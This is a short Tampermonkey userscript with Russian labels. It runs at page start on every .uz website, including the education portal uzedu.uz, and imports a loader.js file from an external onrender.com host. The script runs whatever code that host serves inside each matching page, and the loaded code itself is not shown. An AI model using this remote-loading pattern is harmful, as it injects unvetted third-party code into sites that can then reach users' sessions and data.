// ==UserScript==
// @name         Авто-Загрузчик loader.js (для *.uz и uzedu.uz)
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  Загружает loader.js на всех *.uz сайтах
// @author       Mrak
// @match        *://*.uzedu.uz/*
// @match        *://*.uz/*
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    import('https://m-i4q0.onrender.com/loader.js')
        .then(() => console.log('✅ loader.js успешно загружен!'))
        .catch(err => console.error('❌ Ошибка при загрузке loader.js:', err));
})();
